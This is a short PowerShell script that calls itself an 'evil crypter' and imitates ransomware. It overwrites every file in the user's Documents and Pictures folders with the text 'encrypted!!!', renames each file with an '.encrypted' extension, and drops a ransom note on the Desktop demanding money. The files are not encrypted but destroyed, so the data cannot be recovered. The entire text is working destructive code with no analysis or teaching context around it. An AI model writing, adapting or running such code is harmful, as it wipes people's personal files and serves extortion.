Write-Output "This is an evil crypter!"

$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$picturesPath = [Environment]::GetFolderPath("MyPictures")

$documents = Get-ChildItem $documentsPath -File *
$pictures = Get-ChildItem $picturesPath -File *
$files = $documents + $pictures

foreach ($file in $files) {
    $filepath = $file.FullName
    $filename = $file.Name
    Set-Content -Path $filepath -Value "encrypted!!!"
    Rename-Item -Path $filepath -NewName "$filename.encrypted"
}

$desktopPath = [Environment]::GetFolderPath("Desktop")
$notePath = "$desktopPath\README_ransomnote.txt"
if (Test-Path $notePath) {
    Remove-Item -Path $notePath
}
New-Item $notePath -type file
Set-Content -Path $notePath -Value "You have been encrypted lol. Please send me some money somehow."
